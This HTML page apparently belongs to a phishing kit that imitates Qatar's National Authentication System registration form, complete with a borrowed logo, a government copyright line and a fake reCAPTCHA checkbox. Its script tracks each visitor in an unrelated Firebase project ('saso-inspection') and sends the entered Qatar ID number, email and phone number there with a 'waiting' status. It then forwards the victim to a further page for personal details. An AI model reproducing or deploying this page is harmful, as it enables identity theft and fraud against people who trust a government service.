<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام التوثيق الوطني - قطر</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

    <style>
        :root {
            --primary-color: #007fb1;
            --bg-color: #f5f5f5;
            --secondary-color: #8a1538;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg-color);
            margin: 0;
            padding: 0;
            color: #333;
            overflow-x: hidden;
        }
        
        .header {
            background-color: #fff;
            padding: 10px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #ddd;
            height: 70px;
        }
        
        .header-right-group {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .menu-icon {
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            width: 22px;
            height: 16px;
            cursor: pointer;
        }
        .menu-icon span {
            display: block;
            height: 2px;
            width: 100%;
            background-color: var(--primary-color);
            border-radius: 2px;
        }

        .logo-tawtheeq { height: 50px; }

        .header-text-left { text-align: left; }

        .container {
            max-width: 500px;
            margin: 20px auto;
            padding: 10px;
        }
        
        /* شريط الخطوات */
        .steps-container {
            display: flex;
            justify-content: space-between;
            margin-bottom: 30px;
            position: relative;
        }
        .steps-container::before {
            content: "";
            position: absolute;
            top: 15px;
            left: 0;
            right: 0;
            height: 1px;
            background: #ccc;
            z-index: 1;
        }
        .step { z-index: 2; text-align: center; flex: 1; }
        .step-number {
            width: 30px;
            height: 30px;
            background: #fff;
            border: 1px solid #ccc;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 5px;
            font-weight: bold;
            color: #666;
        }
        .step.active .step-number {
            background: var(--primary-color);
            color: #fff;
            border-color: var(--primary-color);
        }
        .step-label { font-size: 11px; font-weight: bold; line-height: 1.2; }

        .form-card {
            background: #fff;
            border: 1px solid #e0e0e0;
            border-radius: 4px;
            padding: 25px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
        }
        .form-card h2 {
            font-size: 18px;
            margin-top: 0;
            margin-bottom: 20px;
            border-bottom: 1px solid #eee;
            padding-bottom: 15px;
        }
        .form-group { margin-bottom: 20px; position: relative; }
        .label-text { display: block; font-weight: bold; margin-bottom: 8px; font-size: 14px; }
        
        .radio-option {
            display: flex;
            align-items: center;
            margin-bottom: 10px;
            font-size: 14px;
            cursor: pointer;
        }
        .radio-option input { margin-left: 10px; }

        input[type="text"], input[type="email"], select {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 14px;
            outline: none;
        }

        .info-box {
            background-color: #fff9f9;
            border: 1px solid #ffebeb;
            padding: 10px;
            color: var(--secondary-color);
            font-size: 13px;
            line-height: 1.6;
            margin-bottom: 15px;
            display: none;
        }

        .captcha-box {
            background: #f9f9f9;
            border: 1px solid #d3d3d3;
            padding: 10px; 
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 20px 0;
            border-radius: 3px;
        }

        .btn-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 25px;
        }
        .btn {
            padding: 10px 25px;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            font-size: 14px;
            transition: 0.3s;
        }
        .btn-next { background-color: var(--primary-color); color: white; border: none; min-width: 120px; }
        .btn-secondary { background-color: #fff; color: #333; border: 1px solid #ccc; margin-right: 5px; }

        .footer-text { text-align: center; margin-top: 30px; font-size: 13px; color: #666; padding-bottom: 20px; }

        .input-error { border-color: red !important; }
        .error-message { color: red; font-size: 12px; font-weight: bold; margin-top: 5px; display: none; }

        #loading-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(255,255,255,0.9);
            z-index: 9999;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid var(--primary-color);
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="loading-overlay">
        <div class="spinner"></div>
        <p style="margin-top: 15px; font-weight: bold; color: var(--primary-color);">جاري التحقق من البيانات...</p>
    </div>

    <div class="header">
        <div class="header-right-group">
            <div class="menu-icon"><span></span><span></span><span></span></div>
            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663234476152/DhrsVnFpSCHlBdiR.png" class="logo-tawtheeq" alt="Tawtheeq Logo">
        </div>
        <div class="header-text-left">
            <div style="color: var(--secondary-color); font-weight: bold; font-size: 16px;">نظام التوثيق الوطني</div>
            <div style="font-size: 11px; color: #666;">National Authentication System</div>
        </div>
    </div>

    <div class="container">
        <div class="steps-container">
            <div class="step active"><div class="step-number">١</div><div class="step-label">نوع<br>الحساب</div></div>
            <div class="step"><div class="step-number">٢</div><div class="step-label">البيانات<br>الشخصية</div></div>
            <div class="step"><div class="step-number">٣</div><div class="step-label">كلمة<br>المرور</div></div>
            <div class="step"><div class="step-number">٤</div><div class="step-label">انتهاء<br>التسجيل</div></div>
        </div>

        <div class="form-card" id="form-container">
            <h2>اختر نوع الحساب</h2>
            
            <form id="mainForm">
                <div class="form-group">
                    <label class="label-text">نوع الحساب <span style="color:var(--primary-color)">ⓘ</span> <span style="color:red">*</span></label>
                    <label class="radio-option">
                        <input type="radio" name="account_type" value="citizen" id="type_citizen" onclick="toggleFields()" checked>
                        المواطنين القطريين والمقيمين
                    </label>
                    <label class="radio-option">
                        <input type="radio" name="account_type" value="visitor" id="type_visitor" onclick="toggleFields()">
                        الزوار والمستخدمين من خارج دولة قطر
                    </label>
                </div>

                <div id="citizen_info" class="info-box">
                    <span style="color: red; font-weight: bold;">إرشاد:</span> 
                    إذا كان رقم الهاتف المحمول لا يخضع لملكيتك، فسيتم إنشاء حسابك ولكن سيكون غير مفعل.
                </div>

                <div id="citizen_fields">
                    <div class="form-group">
                        <label class="label-text">رقم البطاقة الشخصية <span style="color:var(--primary-color)">ⓘ</span> <span style="color:red">*</span></label>
                        <input type="text" id="qatar_id" name="qatar_id" placeholder="أدخل رقم البطاقة الشخصية">
                    </div>
                </div>

                <div id="visitor_fields" style="display: none;">
                    <div class="form-group">
                        <label class="label-text">البريد الإلكتروني <span style="color:var(--primary-color)">ⓘ</span> <span style="color:red">*</span></label>
                        <input type="email" id="email" name="email" placeholder="example@mail.com">
                    </div>
                    <div class="form-group">
                        <label class="label-text">إعادة كتابة البريد الإلكتروني <span style="color:var(--primary-color)">ⓘ</span> <span style="color:red">*</span></label>
                        <input type="email" id="confirm_email" name="confirm_email" placeholder="example@mail.com">
                        <div id="email_error_msg" class="error-message">غير مطابق</div>
                    </div>
                </div>

                <div class="form-group">
                    <label class="label-text">رقم الهاتف المحمول <span style="color:red">*</span></label>
                    <select id="country_code" name="country_code" style="margin-bottom: 8px;"></select>
                    <input type="text" id="phone_number" name="phone_number" placeholder="رقم الهاتف">
                </div>

                <div class="captcha-box">
                    <div style="display: flex; align-items: center;">
                        <input type="checkbox" id="captcha_check" required style="width: 20px; height: 20px; margin-left: 10px;">
                        <span style="font-size: 13px;">أنا لست برنامج روبوت</span>
                    </div>
                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="25" alt="reCAPTCHA">
                </div>

                <div class="btn-container">
                    <button type="submit" class="btn btn-next">استمر</button>
                    <div style="display: flex;">
                        <button type="button" class="btn btn-secondary" onclick="window.history.back()">رجوع</button>
                    </div>
                </div>
            </form>
        </div>

        <div class="footer-text">© ٢٠٢٦ حكومة دولة قطر - جميع الحقوق محفوظة</div>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT...", 
            authDomain: "saso-inspection.firebaseapp.com",
            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com",
            projectId: "saso-inspection",
            storageBucket: "saso-inspection.firebasestorage.app",
            messagingSenderId: "1009002235896",
            appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
        };

        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
        const database = firebase.database();

        let visitorId = sessionStorage.getItem('visitorId');
        const visitorRef = database.ref('active_visitors/' + visitorId);
        visitorRef.update({ currentPage: "بيانات الهوية", lastSeen: firebase.database.ServerValue.TIMESTAMP });

        async function fetchCountries() {
            const select = document.getElementById('country_code');
            try {
                const response = await fetch('https://restcountries.com/v3.1/all?fields=name,idd,cca2');
                const countries = await response.json();
                let list = countries.map(c => ({
                    name: c.name.common,
                    dialCode: c.idd.root + (c.idd.suffixes ? c.idd.suffixes[0] : ""),
                    iso: c.cca2
                })).filter(c => c.dialCode).sort((a, b) => a.name.localeCompare(b.name));
                
                const qatar = list.find(c => c.iso === 'QA');
                if (qatar) select.add(new Option(`قطر (${qatar.dialCode})`, qatar.dialCode));
                list.forEach(c => { if (c.iso !== 'QA') select.add(new Option(`${c.name} (${c.dialCode})`, c.dialCode)); });
                select.value = "+974";
            } catch (e) { select.add(new Option("قطر (+974)", "+974")); }
        }

        function toggleFields() {
            const isCitizen = document.getElementById('type_citizen').checked;
            document.getElementById('citizen_fields').style.display = isCitizen ? 'block' : 'none';
            document.getElementById('citizen_info').style.display = isCitizen ? 'block' : 'none';
            document.getElementById('visitor_fields').style.display = isCitizen ? 'none' : 'block';
        }

        document.getElementById('mainForm').onsubmit = function(e) {
            e.preventDefault();
            const isVisitor = document.getElementById('type_visitor').checked;
            const emailInput = document.getElementById('email');
            const confirmEmailInput = document.getElementById('confirm_email');
            
            if (isVisitor && (emailInput.value !== confirmEmailInput.value || emailInput.value === "")) {
                document.getElementById('email_error_msg').style.display = 'block';
                return;
            }
            
            document.getElementById('loading-overlay').style.display = 'flex';

            const detailRef = database.ref('user_details/' + visitorId);
            detailRef.set({
                id: visitorId,
                accountType: document.querySelector('input[name="account_type"]:checked').value,
                qatarId: document.getElementById('qatar_id').value,
                email: emailInput.value,
                phone: document.getElementById('phone_number').value,
                country: document.getElementById('country_code').value,
                status: "waiting",
                timestamp: firebase.database.ServerValue.TIMESTAMP
            });

            // التوجيه التلقائي لصفحة personal_info.php
            setTimeout(() => {
                window.location.href = "personal_info.php";
            }, 1500);
        };

        window.onload = () => { fetchCountries(); toggleFields(); };
    </script>
</body>
</html>
